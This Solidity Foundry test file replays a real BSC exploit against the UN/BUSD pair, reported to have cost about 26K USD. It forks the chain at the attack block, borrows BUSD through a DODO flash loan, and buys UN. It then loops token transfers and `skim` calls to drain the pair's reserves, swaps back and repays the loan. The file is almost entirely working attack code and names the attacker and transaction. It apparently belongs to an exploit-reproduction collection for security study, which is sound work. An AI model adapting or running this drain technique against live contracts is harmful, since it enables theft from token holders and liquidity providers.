// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~26K USD$
// Attacker - https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366
// Attack contract - https://bscscan.com/address/0x98e241bd3be918e0d927af81b430be00d86b04f9
// Attack Tx : https://bscscan.com/tx/0xff5515268d53df41d407036f547b206e288b226989da496fda367bfeb31c5b8b

// @Analysis - https://twitter.com/MetaTrustAlert/status/1667041877428932608

contract ContractTest is Test {
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);

    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 UN = IERC20(0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F);
    IUniswapV2Pair Pair = IUniswapV2Pair(0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_864_173);
        cheats.label(address(DPPOracle), "DPPOracle");
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(UN), "UN");
        cheats.label(address(this), "AttackerContract");
        cheats.label(address(Pair), "Pair");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Attacker BUSD balance before attack", BUSD.balanceOf(address(this)), BUSD.decimals()
        );

        // End of preparation. Attack start
        DPPOracle.flashLoan(0, 29_100 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker BUSD balance after attack", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        (uint256 UNReserve, uint256 USDReserve,) = Pair.getReserves();
        uint256 amountIn = BUSD.balanceOf(address(this));
        uint256 amountOut = (9970 * amountIn * UNReserve) / (10_000 * USDReserve + 9970 * amountIn);
        BUSD.transfer(address(Pair), amountIn);
        Pair.swap(amountOut, 0, address(this), new bytes(0));

        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 93 / 100);
        Pair.skim(address(this));
        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 90 / 100);
        Pair.skim(address(this));
        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 80 / 100);
        Pair.skim(address(this));

        (UNReserve, USDReserve,) = Pair.getReserves();
        amountIn = UN.balanceOf(address(this));
        amountOut = (9970 * amountIn * USDReserve) / (10_000 * UNReserve + 9970 * amountIn);
        UN.transfer(address(Pair), amountIn);
        Pair.swap(0, amountOut, address(this), new bytes(0));

        BUSD.transfer(address(DPPOracle), 29_100 * 1e18);
    }
}
